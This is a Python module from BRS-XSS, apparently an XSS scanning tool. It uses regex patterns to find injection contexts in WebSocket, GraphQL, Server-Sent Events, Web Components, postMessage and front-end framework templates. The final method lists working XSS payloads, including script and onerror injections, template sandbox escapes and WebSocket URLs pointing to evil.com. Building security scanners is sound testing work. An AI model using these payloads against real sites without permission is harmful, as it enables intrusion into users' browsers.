#!/usr/bin/env python3

"""
Project: BRS-XSS v3.0.0
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: Thu 26 Dec 2024 UTC
Status: Created
Telegram: https://t.me/EasyProTech

Advanced Context Detector - WebSocket, GraphQL, SSE, Web Components detection.
"""

import re
from typing import Optional, Any
from dataclasses import dataclass, field

from .context_types import ContextType
from ..utils.logger import Logger

logger = Logger("core.advanced_context_detector")


@dataclass
class WebSocketContext:
    """WebSocket context analysis result"""

    is_websocket: bool = False
    ws_url: str = ""
    message_handlers: list[str] = field(default_factory=list)
    send_patterns: list[str] = field(default_factory=list)
    protocol: str = ""  # ws:// or wss://
    injection_points: list[dict[str, Any]] = field(default_factory=list)


@dataclass
class GraphQLContext:
    """GraphQL context analysis result"""

    is_graphql: bool = False
    operation_type: str = ""  # query, mutation, subscription
    operation_name: str = ""
    variables: dict[str, Any] = field(default_factory=dict)
    injection_points: list[dict[str, Any]] = field(default_factory=list)


@dataclass
class SSEContext:
    """Server-Sent Events context analysis result"""

    is_sse: bool = False
    event_source_url: str = ""
    event_handlers: list[str] = field(default_factory=list)
    injection_points: list[dict[str, Any]] = field(default_factory=list)


@dataclass
class WebComponentContext:
    """Web Component context analysis result"""

    is_web_component: bool = False
    component_name: str = ""
    shadow_mode: str = ""  # open, closed
    slots: list[str] = field(default_factory=list)
    injection_points: list[dict[str, Any]] = field(default_factory=list)


class AdvancedContextDetector:
    """
    Advanced context detector for modern web technologies.

    Detects XSS injection contexts in:
    - WebSocket connections and messages
    - GraphQL queries and mutations
    - Server-Sent Events (SSE)
    - Web Components and Shadow DOM
    - postMessage communications
    - Framework-specific templates
    """

    # WebSocket patterns
    WS_URL_PATTERN = re.compile(
        r'new\s+WebSocket\s*\(\s*[\'"`]?(wss?://[^\'"`\s)]+|[^\'"`\s)]+)[\'"`]?\s*\)',
        re.IGNORECASE,
    )
    WS_SEND_PATTERN = re.compile(r"\.send\s*\(\s*([^)]+)\)", re.IGNORECASE)
    WS_MESSAGE_HANDLER = re.compile(
        r'\.onmessage\s*=|\.addEventListener\s*\(\s*[\'"`]message[\'"`]', re.IGNORECASE
    )

    # GraphQL patterns
    GRAPHQL_QUERY_PATTERN = re.compile(
        r"(query|mutation|subscription)\s+(\w+)?\s*(\([^)]*\))?\s*\{", re.IGNORECASE
    )
    GRAPHQL_VARIABLE_PATTERN = re.compile(r"\$(\w+)\s*:\s*(\w+!?)", re.IGNORECASE)
    GRAPHQL_ENDPOINT_PATTERN = re.compile(
        r'[\'"`](/graphql|/api/graphql|/gql)[\'"`]', re.IGNORECASE
    )

    # SSE patterns
    SSE_EVENTSOURCE_PATTERN = re.compile(
        r'new\s+EventSource\s*\(\s*[\'"`]?([^\'"`\s)]+)[\'"`]?\s*\)', re.IGNORECASE
    )
    SSE_ONMESSAGE_PATTERN = re.compile(
        r'\.onmessage\s*=|\.addEventListener\s*\(\s*[\'"`](message|open|error)[\'"`]',
        re.IGNORECASE,
    )

    # Web Components patterns
    CUSTOM_ELEMENT_DEFINE = re.compile(
        r'customElements\.define\s*\(\s*[\'"`]([a-z][\w-]*-[\w-]*)[\'"`]', re.IGNORECASE
    )
    SHADOW_DOM_ATTACH = re.compile(
        r'\.attachShadow\s*\(\s*\{\s*mode\s*:\s*[\'"`](open|closed)[\'"`]',
        re.IGNORECASE,
    )
    SLOT_PATTERN = re.compile(
        r'<slot(?:\s+name\s*=\s*[\'"`]([^\'"`]+)[\'"`])?\s*/?>', re.IGNORECASE
    )
    TEMPLATE_SHADOWROOT = re.compile(
        r'<template\s+(?:shadowroot|shadowrootmode)\s*=\s*[\'"`](open|closed)[\'"`]',
        re.IGNORECASE,
    )

    # postMessage patterns
    POSTMESSAGE_SEND = re.compile(r"\.postMessage\s*\(\s*([^,]+)", re.IGNORECASE)
    POSTMESSAGE_LISTENER = re.compile(
        r'addEventListener\s*\(\s*[\'"`]message[\'"`]', re.IGNORECASE
    )
    POSTMESSAGE_ORIGIN_CHECK = re.compile(
        r'(?:event|e|evt)\.origin\s*(?:===?|!==?)\s*[\'"`]([^\'"`]+)[\'"`]',
        re.IGNORECASE,
    )

    # Framework patterns
    ANGULAR_EXPRESSION = re.compile(r"\{\{([^}]+)\}\}")
    VUE_EXPRESSION = re.compile(r'\{\{([^}]+)\}\}|v-html\s*=\s*[\'"`]([^\'"`]+)[\'"`]')
    REACT_DANGEROUSLY = re.compile(r"dangerouslySetInnerHTML\s*=\s*\{\{")

    def __init__(self):
        """Initialize advanced context detector"""
        logger.info("Advanced context detector initialized")

    def detect_websocket_context(
        self, content: str, marker: str
    ) -> tuple[bool, WebSocketContext]:
        """
        Detect WebSocket context and injection points.

        Args:
            content: Source code content
            marker: Injection marker to find

        Returns:
            tuple of (is_websocket_context, WebSocketContext)
        """
        ws_context = WebSocketContext()

        # Find WebSocket URL constructions
        ws_urls = self.WS_URL_PATTERN.findall(content)
        if ws_urls:
            ws_context.is_websocket = True
            ws_context.ws_url = ws_urls[0] if ws_urls else ""
            ws_context.protocol = "wss://" if "wss://" in content.lower() else "ws://"

        # Find message handlers
        if self.WS_MESSAGE_HANDLER.search(content):
            ws_context.message_handlers.append("onmessage")

        # Find send patterns
        send_matches = self.WS_SEND_PATTERN.findall(content)
        ws_context.send_patterns = send_matches

        # Check if marker is in WebSocket context
        if marker in content:
            marker_pos = content.find(marker)

            # Check if marker is in WebSocket URL
            for url_match in self.WS_URL_PATTERN.finditer(content):
                if url_match.start() <= marker_pos <= url_match.end():
                    ws_context.injection_points.append(
                        {
                            "type": "websocket_url",
                            "position": marker_pos,
                            "context": ContextType.WEBSOCKET_URL,
                        }
                    )

            # Check if marker is in send() call
            for send_match in self.WS_SEND_PATTERN.finditer(content):
                if send_match.start() <= marker_pos <= send_match.end():
                    ws_context.injection_points.append(
                        {
                            "type": "websocket_message",
                            "position": marker_pos,
                            "context": ContextType.WEBSOCKET_MESSAGE,
                        }
                    )

        return ws_context.is_websocket or bool(ws_context.injection_points), ws_context

    def detect_graphql_context(
        self, content: str, marker: str
    ) -> tuple[bool, GraphQLContext]:
        """
        Detect GraphQL context and injection points.

        Args:
            content: Source code content
            marker: Injection marker to find

        Returns:
            tuple of (is_graphql_context, GraphQLContext)
        """
        gql_context = GraphQLContext()

        # Check for GraphQL endpoint
        if self.GRAPHQL_ENDPOINT_PATTERN.search(content):
            gql_context.is_graphql = True

        # Find GraphQL operations
        query_matches = self.GRAPHQL_QUERY_PATTERN.findall(content)
        if query_matches:
            gql_context.is_graphql = True
            if query_matches[0]:
                gql_context.operation_type = query_matches[0][0].lower()
                gql_context.operation_name = (
                    query_matches[0][1] if len(query_matches[0]) > 1 else ""
                )

        # Find variables
        var_matches = self.GRAPHQL_VARIABLE_PATTERN.findall(content)
        for var_name, var_type in var_matches:
            gql_context.variables[var_name] = var_type

        # Check if marker is in GraphQL context
        if marker in content:
            marker_pos = content.find(marker)

            # Check if in query/mutation body
            for query_match in self.GRAPHQL_QUERY_PATTERN.finditer(content):
                # Find the closing brace for this query
                query_start = query_match.start()
                brace_count = 0
                query_end = query_start

                for i, char in enumerate(content[query_start:], query_start):
                    if char == "{":
                        brace_count += 1
                    elif char == "}":
                        brace_count -= 1
                        if brace_count == 0:
                            query_end = i
                            break

                if query_start <= marker_pos <= query_end:
                    gql_context.injection_points.append(
                        {
                            "type": "graphql_query",
                            "position": marker_pos,
                            "context": ContextType.GRAPHQL_QUERY,
                            "operation": gql_context.operation_type,
                        }
                    )

            # Check if in variable definition
            for var_match in self.GRAPHQL_VARIABLE_PATTERN.finditer(content):
                if var_match.start() <= marker_pos <= var_match.end():
                    gql_context.injection_points.append(
                        {
                            "type": "graphql_variable",
                            "position": marker_pos,
                            "context": ContextType.GRAPHQL_VARIABLE,
                            "variable_name": var_match.group(1),
                        }
                    )

        return gql_context.is_graphql or bool(gql_context.injection_points), gql_context

    def detect_sse_context(self, content: str, marker: str) -> tuple[bool, SSEContext]:
        """
        Detect Server-Sent Events context and injection points.

        Args:
            content: Source code content
            marker: Injection marker to find

        Returns:
            tuple of (is_sse_context, SSEContext)
        """
        sse_context = SSEContext()

        # Find EventSource constructions
        es_matches = self.SSE_EVENTSOURCE_PATTERN.findall(content)
        if es_matches:
            sse_context.is_sse = True
            sse_context.event_source_url = es_matches[0] if es_matches else ""

        # Find event handlers
        if self.SSE_ONMESSAGE_PATTERN.search(content):
            sse_context.event_handlers.append("onmessage")

        # Check if marker is in SSE context
        if marker in content:
            marker_pos = content.find(marker)

            # Check if in EventSource URL
            for es_match in self.SSE_EVENTSOURCE_PATTERN.finditer(content):
                if es_match.start() <= marker_pos <= es_match.end():
                    sse_context.injection_points.append(
                        {
                            "type": "sse_url",
                            "position": marker_pos,
                            "context": ContextType.SSE_DATA,
                        }
                    )

            # Check if in event data handling
            # Look for patterns like event.data, e.data
            data_pattern = re.compile(r"(?:event|e|evt)\.data", re.IGNORECASE)
            for data_match in data_pattern.finditer(content):
                # Check if marker is near data usage
                if abs(data_match.start() - marker_pos) < 100:
                    sse_context.injection_points.append(
                        {
                            "type": "sse_data",
                            "position": marker_pos,
                            "context": ContextType.SSE_DATA,
                        }
                    )

        return sse_context.is_sse or bool(sse_context.injection_points), sse_context

    def detect_web_component_context(
        self, content: str, marker: str
    ) -> tuple[bool, WebComponentContext]:
        """
        Detect Web Component context and injection points.

        Args:
            content: Source code content
            marker: Injection marker to find

        Returns:
            tuple of (is_web_component_context, WebComponentContext)
        """
        wc_context = WebComponentContext()

        # Find custom element definitions
        ce_matches = self.CUSTOM_ELEMENT_DEFINE.findall(content)
        if ce_matches:
            wc_context.is_web_component = True
            wc_context.component_name = ce_matches[0] if ce_matches else ""

        # Find Shadow DOM attachments
        shadow_matches = self.SHADOW_DOM_ATTACH.findall(content)
        if shadow_matches:
            wc_context.is_web_component = True
            wc_context.shadow_mode = shadow_matches[0] if shadow_matches else ""

        # Find declarative Shadow DOM
        template_shadow = self.TEMPLATE_SHADOWROOT.findall(content)
        if template_shadow:
            wc_context.is_web_component = True
            wc_context.shadow_mode = template_shadow[0] if template_shadow else ""

        # Find slots
        slot_matches = self.SLOT_PATTERN.findall(content)
        wc_context.slots = [s for s in slot_matches if s]

        # Check if marker is in Web Component context
        if marker in content:
            marker_pos = content.find(marker)

            # Check if in Shadow DOM innerHTML
            shadow_inner = re.compile(
                r'\.innerHTML\s*=\s*[\'"`]([^\'"`]*)', re.IGNORECASE
            )
            for inner_match in shadow_inner.finditer(content):
                if inner_match.start() <= marker_pos <= inner_match.end():
                    wc_context.injection_points.append(
                        {
                            "type": "shadow_dom",
                            "position": marker_pos,
                            "context": ContextType.SHADOW_DOM,
                        }
                    )

            # Check if in slot content
            for slot_match in self.SLOT_PATTERN.finditer(content):
                if slot_match.start() <= marker_pos <= slot_match.end():
                    wc_context.injection_points.append(
                        {
                            "type": "slot_content",
                            "position": marker_pos,
                            "context": ContextType.SLOT_CONTENT,
                        }
                    )

            # Check if in custom element attribute
            custom_tag_pattern = re.compile(
                r"<([a-z][\w-]*-[\w-]*)\s+[^>]*>", re.IGNORECASE
            )
            for tag_match in custom_tag_pattern.finditer(content):
                if tag_match.start() <= marker_pos <= tag_match.end():
                    wc_context.injection_points.append(
                        {
                            "type": "custom_element",
                            "position": marker_pos,
                            "context": ContextType.CUSTOM_ELEMENT,
                            "tag_name": tag_match.group(1),
                        }
                    )

        return (
            wc_context.is_web_component or bool(wc_context.injection_points),
            wc_context,
        )

    def detect_postmessage_context(
        self, content: str, marker: str
    ) -> tuple[bool, dict[str, Any]]:
        """
        Detect postMessage context and injection points.

        Args:
            content: Source code content
            marker: Injection marker to find

        Returns:
            tuple of (is_postmessage_context, context_info)
        """
        pm_context: dict[str, Any] = {
            "is_postmessage": False,
            "has_send": False,
            "has_listener": False,
            "origin_checks": [],
            "injection_points": [],
        }

        # Find postMessage sends
        if self.POSTMESSAGE_SEND.search(content):
            pm_context["is_postmessage"] = True
            pm_context["has_send"] = True

        # Find message listeners
        if self.POSTMESSAGE_LISTENER.search(content):
            pm_context["is_postmessage"] = True
            pm_context["has_listener"] = True

        # Find origin checks
        origin_matches = self.POSTMESSAGE_ORIGIN_CHECK.findall(content)
        pm_context["origin_checks"] = origin_matches

        # Check if marker is in postMessage context
        if marker in content:
            marker_pos = content.find(marker)

            # Check if in postMessage data
            for pm_match in self.POSTMESSAGE_SEND.finditer(content):
                if pm_match.start() <= marker_pos <= pm_match.end():
                    pm_context["injection_points"].append(
                        {
                            "type": "postmessage_data",
                            "position": marker_pos,
                            "context": ContextType.POSTMESSAGE_DATA,
                        }
                    )

            # Check if in origin check
            for origin_match in self.POSTMESSAGE_ORIGIN_CHECK.finditer(content):
                if origin_match.start() <= marker_pos <= origin_match.end():
                    pm_context["injection_points"].append(
                        {
                            "type": "postmessage_origin",
                            "position": marker_pos,
                            "context": ContextType.POSTMESSAGE_ORIGIN,
                        }
                    )

        return (
            pm_context["is_postmessage"] or bool(pm_context["injection_points"]),
            pm_context,
        )

    def detect_framework_context(
        self, content: str, marker: str
    ) -> tuple[Optional[ContextType], dict[str, Any]]:
        """
        Detect framework-specific template context.

        Args:
            content: Source code content
            marker: Injection marker to find

        Returns:
            tuple of (context_type, context_info)
        """
        context_info: dict[str, Any] = {
            "framework": None,
            "expression": None,
            "injection_points": [],
        }

        if marker not in content:
            return None, context_info

        marker_pos = content.find(marker)

        # Check Angular/Vue template expressions {{ }}
        for expr_match in self.ANGULAR_EXPRESSION.finditer(content):
            if expr_match.start() <= marker_pos <= expr_match.end():
                # Determine if Angular or Vue based on other patterns
                if "ng-" in content or "angular" in content.lower():
                    context_info["framework"] = "angular"
                    context_info["expression"] = expr_match.group(1)
                    context_info["injection_points"].append(
                        {
                            "type": "angular_template",
                            "position": marker_pos,
                            "context": ContextType.ANGULAR_TEMPLATE,
                        }
                    )
                    return ContextType.ANGULAR_TEMPLATE, context_info
                elif "v-" in content or "vue" in content.lower():
                    context_info["framework"] = "vue"
                    context_info["expression"] = expr_match.group(1)
                    context_info["injection_points"].append(
                        {
                            "type": "vue_template",
                            "position": marker_pos,
                            "context": ContextType.VUE_TEMPLATE,
                        }
                    )
                    return ContextType.VUE_TEMPLATE, context_info

        # Check Vue v-html directive
        for vue_match in self.VUE_EXPRESSION.finditer(content):
            if vue_match.start() <= marker_pos <= vue_match.end():
                context_info["framework"] = "vue"
                context_info["injection_points"].append(
                    {
                        "type": "vue_template",
                        "position": marker_pos,
                        "context": ContextType.VUE_TEMPLATE,
                    }
                )
                return ContextType.VUE_TEMPLATE, context_info

        # Check React dangerouslySetInnerHTML
        for react_match in self.REACT_DANGEROUSLY.finditer(content):
            if react_match.start() <= marker_pos <= react_match.end() + 100:
                context_info["framework"] = "react"
                context_info["injection_points"].append(
                    {
                        "type": "react_jsx",
                        "position": marker_pos,
                        "context": ContextType.REACT_JSX,
                    }
                )
                return ContextType.REACT_JSX, context_info

        return None, context_info

    def analyze_all_contexts(self, content: str, marker: str) -> dict[str, Any]:
        """
        Analyze content for all advanced contexts.

        Args:
            content: Source code content
            marker: Injection marker to find

        Returns:
            Dictionary with all detected contexts
        """
        results: dict[str, Any] = {
            "websocket": None,
            "graphql": None,
            "sse": None,
            "web_component": None,
            "postmessage": None,
            "framework": None,
            "detected_contexts": [],
            "injection_points": [],
        }

        # Detect WebSocket context
        is_ws, ws_ctx = self.detect_websocket_context(content, marker)
        if is_ws:
            results["websocket"] = ws_ctx
            results["detected_contexts"].append("websocket")
            results["injection_points"].extend(ws_ctx.injection_points)

        # Detect GraphQL context
        is_gql, gql_ctx = self.detect_graphql_context(content, marker)
        if is_gql:
            results["graphql"] = gql_ctx
            results["detected_contexts"].append("graphql")
            results["injection_points"].extend(gql_ctx.injection_points)

        # Detect SSE context
        is_sse, sse_ctx = self.detect_sse_context(content, marker)
        if is_sse:
            results["sse"] = sse_ctx
            results["detected_contexts"].append("sse")
            results["injection_points"].extend(sse_ctx.injection_points)

        # Detect Web Component context
        is_wc, wc_ctx = self.detect_web_component_context(content, marker)
        if is_wc:
            results["web_component"] = wc_ctx
            results["detected_contexts"].append("web_component")
            results["injection_points"].extend(wc_ctx.injection_points)

        # Detect postMessage context
        is_pm, pm_ctx = self.detect_postmessage_context(content, marker)
        if is_pm:
            results["postmessage"] = pm_ctx
            results["detected_contexts"].append("postmessage")
            results["injection_points"].extend(pm_ctx["injection_points"])

        # Detect framework context
        fw_context, fw_info = self.detect_framework_context(content, marker)
        if fw_context:
            results["framework"] = fw_info
            results["detected_contexts"].append(f"framework_{fw_info['framework']}")
            results["injection_points"].extend(fw_info["injection_points"])

        logger.debug(
            f"Advanced context analysis: {len(results['detected_contexts'])} contexts detected"
        )
        return results

    def get_payload_recommendations(self, context_type: ContextType) -> list[str]:
        """
        Get payload recommendations for advanced context types.

        Args:
            context_type: The detected context type

        Returns:
            list of recommended payloads
        """
        recommendations = {
            ContextType.WEBSOCKET_MESSAGE: [
                "<script>alert(1)</script>",
                '{"type":"xss","payload":"<img src=x onerror=alert(1)>"}',
                "javascript:alert(1)",
                "</script><script>alert(1)</script>",
            ],
            ContextType.WEBSOCKET_URL: [
                "ws://evil.com/xss",
                "wss://evil.com/?callback=alert",
                "javascript:alert(1)//",
            ],
            ContextType.GRAPHQL_QUERY: [
                '"}};alert(1);//',
                "__typename",
                "{__schema{types{name}}}",
                'mutation{createUser(input:{name:"<script>alert(1)</script>"})}',
            ],
            ContextType.GRAPHQL_VARIABLE: [
                "<script>alert(1)</script>",
                '{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}',
            ],
            ContextType.SSE_DATA: [
                "data: <script>alert(1)</script>",
                'event: message\ndata: {"xss":"<img src=x onerror=alert(1)>"}',
            ],
            ContextType.SHADOW_DOM: [
                "<img src=x onerror=alert(1)>",
                "<script>alert(1)</script>",
                "<slot onslotchange=alert(1)>",
            ],
            ContextType.CUSTOM_ELEMENT: [
                '" onclick="alert(1)" "',
                "' onfocus='alert(1)' autofocus '",
            ],
            ContextType.POSTMESSAGE_DATA: [
                "<img src=x onerror=alert(1)>",
                '{"type":"xss","html":"<script>alert(1)</script>"}',
                "javascript:alert(1)",
            ],
            ContextType.ANGULAR_TEMPLATE: [
                '{{constructor.constructor("alert(1)")()}}',
                '{{$eval.constructor("alert(1)")()}}',
                '{{$on.constructor("alert(1)")()}}',
            ],
            ContextType.VUE_TEMPLATE: [
                '{{constructor.constructor("alert(1)")()}}',
                '{{$root.constructor.constructor("alert(1)")()}}',
            ],
            ContextType.REACT_JSX: [
                "<img src=x onerror=alert(1)>",
                "javascript:alert(1)",
            ],
        }

        return recommendations.get(context_type, [])
